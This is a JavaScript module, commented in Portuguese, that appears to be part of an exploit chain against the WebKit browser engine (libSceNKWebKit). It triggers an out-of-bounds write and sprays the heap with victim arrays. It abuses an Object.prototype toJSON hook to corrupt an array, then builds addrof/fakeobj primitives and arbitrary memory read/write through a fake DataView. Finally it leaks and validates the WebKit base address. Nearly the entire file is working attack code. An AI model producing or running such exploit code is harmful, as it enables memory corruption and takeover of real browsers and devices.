// js/script3/testArrayBufferVictimCrash.mjs (ATUALIZADO PARA v83_R45-Shotgun)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    oob_write_absolute,
    isOOBReady
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

// Novo nome para a estratégia R45 (Shotgun Butterfly Corruption)
export const FNAME_MODULE_SHOTGUN_CORRUPTION_R45 = "WebKitExploit_ShotgunCorruption_R45";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE = 0x7C;
const OOB_WRITE_VALUE = 0xABABABAB;

// --- Nova Estratégia: R45-Shotgun ---
const SPRAY_SIZE = 200;
let victim_spray = [];
let shared_buffer = new ArrayBuffer(8);
let shared_float_view = new Float64Array(shared_buffer);

let corrupted_victim_index = -1;
let addrof_primitive = null;
let fakeobj_primitive = null;
let webkit_base_address = null;

// A nova sonda que usa a técnica "shotgun"
function toJSON_ShotgunCorruptionProbe_R45() {
    // Escreve em múltiplos offsets na esperança de acertar o butterfly do vizinho.
    this.a = shared_buffer;
    this.b = shared_buffer;
    this.c = shared_buffer;
    this.d = shared_buffer;

    for (let i = 0; i < SPRAY_SIZE; i++) {
        // Se o butterfly foi corrompido, o tamanho do array mudará drasticamente.
        if (victim_spray[i].length > 1) {
            logS3(`[PROBE_R45] SUCESSO! Butterfly do spray[${i}] corrompido! Tamanho agora: ${victim_spray[i].length}`, "vuln");
            corrupted_victim_index = i;
            // Limpa o array corrompido para evitar crashes e prepara para a primitiva
            victim_spray[i][0] = 0; 
            return { probe_executed: "R45-Shotgun-Success" };
        }
    }
    return { probe_executed: "R45-Shotgun-Fail" };
}

function build_primitives() {
    if (corrupted_victim_index === -1) {
        throw new Error("Não foi possível construir primitivas: nenhum vítima corrompido encontrado.");
    }
    const victim_array = victim_spray[corrupted_victim_index];

    addrof_primitive = (obj) => {
        victim_array[0] = obj;
        return new AdvancedInt64(shared_float_view[0]);
    };

    fakeobj_primitive = (addr_int64) => {
        shared_float_view[0] = addr_int64.asDouble();
        return victim_array[0];
    };

    logS3("Primitivas `addrof` e `fakeobj` construídas com sucesso.", "good");
}

async function self_test_primitives() {
    logS3("--- Auto-Teste das Primitivas (addrof/fakeobj) ---", "subtest");
    const test_obj = { a: 0x41414141, b: 0x42424242 };
    
    const test_obj_addr = addrof_primitive(test_obj);
    logS3(`  addrof(test_obj) -> ${test_obj_addr.toString(true)}`, "leak");
    if (!isAdvancedInt64Object(test_obj_addr) || test_obj_addr.high() === 0) {
        throw new Error(`Auto-teste addrof falhou: endereço vazado é inválido.`);
    }

    const fake_obj = fakeobj_primitive(test_obj_addr);
    logS3(`  fakeobj(addr) -> Objeto obtido.`, "info");
    
    if (fake_obj.a === test_obj.a && fake_obj.b === test_obj.b) {
        logS3("  SUCESSO: Auto-teste de addrof/fakeobj passou! O objeto falso corresponde ao original.", "vuln");
        return true;
    } else {
        logS3(`  FALHA: Auto-teste de addrof/fakeobj falhou.`, "critical");
        return false;
    }
}

function create_arb_rw_primitives() {
    const FNAME_ARBRW = "create_arb_rw_primitives_R45";
    logS3("--- Construindo Leitura/Escrita Arbitrária (R45) ---", "subtest", FNAME_ARBRW);

    const master_dv = new DataView(new ArrayBuffer(8));
    const master_dv_addr = addrof_primitive(master_dv);

    const fake_dv_struct_array = [
        addrof_primitive(master_dv).asDouble(), // JSCell Header (copiado do mestre)
        0, // Butterfly - não usado por DataView
        0, // Ponteiro para dados (m_vector) - low
        0, // Ponteiro para dados (m_vector) - high
        0xFFFFFFFF, // Tamanho (low)
        0,          // Tamanho (high)
    ];

    const fake_dv_addr = addrof_primitive(fake_dv_struct_array).sub(new AdvancedInt64(1, 0)); // Remove boxing
    logS3(`  Endereço da estrutura do DataView falso: ${fake_dv_addr.toString(true)}`, "leak");

    const arb_rw_dataview = fakeobj_primitive(fake_dv_addr);
    logS3("  DataView para R/W arbitrário criado.", 'good');
    
    window.arb_read = (addr, len) => {
        if (!isAdvancedInt64Object(addr)) addr = new AdvancedInt64(addr);
        
        // Aponta o m_vector do nosso DV falso para o endereço desejado
        fake_dv_struct_array[2] = addr.asDouble();
        
        let buffer = new ArrayBuffer(len);
        let read_view = new DataView(buffer);
        for (let i = 0; i < len; i++) {
            read_view.setUint8(i, arb_rw_dataview.getUint8(i));
        }
        return buffer;
    };

    window.arb_write = (addr, data) => {
        if (!isAdvancedInt64Object(addr)) addr = new AdvancedInt64(addr);

        // Aponta o m_vector do nosso DV falso para o endereço desejado
        fake_dv_struct_array[2] = addr.asDouble();
        
        let write_view = new Uint8Array(data);
        for (let i = 0; i < write_view.length; i++) {
            arb_rw_dataview.setUint8(i, write_view[i]);
        }
    };
    
    logS3("Primitivas `window.arb_read` e `window.arb_write` (R45) estão prontas.", "good", FNAME_ARBRW);
}

async function find_webkit_base() {
    logS3("--- Tentando vazar a base da libSceNKWebKit (R45) ---", "subtest");
    if (typeof window.arb_read !== 'function') {
        throw new Error("A primitiva arb_read não está disponível.");
    }
    
    const func_obj = window.alert; // Uma função nativa do WebKit
    const func_addr = addrof_primitive(func_obj);
    logS3(`  Endereço de window.alert: ${func_addr.toString(true)}`, 'leak');

    const executable_offset = new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET, 0);
    const executable_addr_ptr = func_addr.add(executable_offset);
    const executable_addr_buf = window.arb_read(executable_addr_ptr, 8);
    const executable_addr = new AdvancedInt64(new Uint32Array(executable_addr_buf)[0], new Uint32Array(executable_addr_buf)[1]);
    logS3(`  Ponteiro para a instância Executable: ${executable_addr.toString(true)}`, 'leak');
    
    const jit_code_offset = new AdvancedInt64(0x18, 0);
    const jit_code_addr_ptr = executable_addr.add(jit_code_offset);
    const jit_code_addr_buf = window.arb_read(jit_code_addr_ptr, 8);
    const jit_code_addr = new AdvancedInt64(new Uint32Array(jit_code_addr_buf)[0], new Uint32Array(jit_code_addr_buf)[1]);
    logS3(`  Ponteiro para JITCode: ${jit_code_addr.toString(true)}`, 'leak');
    
    const page_mask = new AdvancedInt64(0, 0).not().shl(14).not();
    webkit_base_address = jit_code_addr.and(page_mask);

    logS3(`  CANDIDATO À BASE DO WEBKIT: ${webkit_base_address.toString(true)}`, "vuln");

    const elf_header_buf = window.arb_read(webkit_base_address, 4);
    const elf_header_view = new Uint8Array(elf_header_buf);
    if (elf_header_view[0] === 0x7F && elf_header_view[1] === 0x45 && elf_header_view[2] === 0x4C && elf_header_view[3] === 0x46) {
        logS3("  Validação ELF: SUCESSO! Cabeçalho '\\x7FELF' encontrado.", "good");
        return true;
    } else {
        logS3("  Validação ELF: FALHA! Cabeçalho não corresponde.", "error");
        webkit_base_address = null;
        return false;
    }
}

export async function executeShotgunCorruptionStrategy_R45() {
    const FNAME_BASE = FNAME_MODULE_SHOTGUN_CORRUPTION_R45;
    logS3(`--- Iniciando ${FNAME_BASE}: Shotgun Corruption Strategy ---`, "test", FNAME_BASE);
    document.title = `${FNAME_BASE} Init R45...`;

    victim_spray = []; corrupted_victim_index = -1; addrof_primitive = null; fakeobj_primitive = null; webkit_base_address = null; window.arb_read = null; window.arb_write = null;
    
    let result = {
        success: false, tc_confirmed: false, primitives_built: false, primitives_tested_ok: false,
        webkit_leak_ok: false, webkit_base_candidate: null, error: null
    };

    try {
        logS3("FASE 1: Preparação do Heap e Trigger da Corrupção", "subtest");
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE, OOB_WRITE_VALUE, 4);
        await PAUSE_S3(50);
        
        for (let i = 0; i < SPRAY_SIZE; i++) {
            victim_spray.push(new Array(0));
        }
        logS3(`Heap pulverizado com ${SPRAY_SIZE} arrays vítimas.`, "info");

        let victim_buffer = new ArrayBuffer(VICTIM_BUFFER_SIZE);
        let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, 'toJSON');
        Object.defineProperty(Object.prototype, 'toJSON', { value: toJSON_ShotgunCorruptionProbe_R45, writable: true, configurable: true, enumerable: false });
        
        JSON.stringify(victim_buffer);

        if (origDesc) Object.defineProperty(Object.prototype, 'toJSON', origDesc); else delete Object.prototype['toJSON'];
        
        if (corrupted_victim_index === -1) {
            throw new Error("TC acionada, mas a corrupção 'shotgun' falhou. Nenhum vítima encontrado.");
        }
        result.tc_confirmed = true;
        
        logS3("FASE 2: Construção e Teste das Primitivas", "subtest");
        build_primitives();
        result.primitives_built = true;
        result.primitives_tested_ok = await self_test_primitives();
        if (!result.primitives_tested_ok) {
            throw new Error("Primitivas construídas, mas falharam no auto-teste.");
        }

        logS3("FASE 3: Criação de R/W Arbitrário e Vazamento da Base do WebKit", "subtest");
        create_arb_rw_primitives();
        result.webkit_leak_ok = await find_webkit_base();
        if (result.webkit_leak_ok) {
            result.webkit_base_candidate = webkit_base_address.toString(true);
            result.success = true;
        }

    } catch (e) {
        logS3(`ERRO CRÍTICO na estratégia R45: ${e.message}`, "critical", FNAME_BASE);
        result.error = e.message;
        console.error(e);
    } finally {
        await clearOOBEnvironment();
        victim_spray = [];
    }
    
    logS3(`--- ${FNAME_BASE} Finalizada. Sucesso Geral: ${result.success} ---`, "test", FNAME_BASE);
    return result;
}
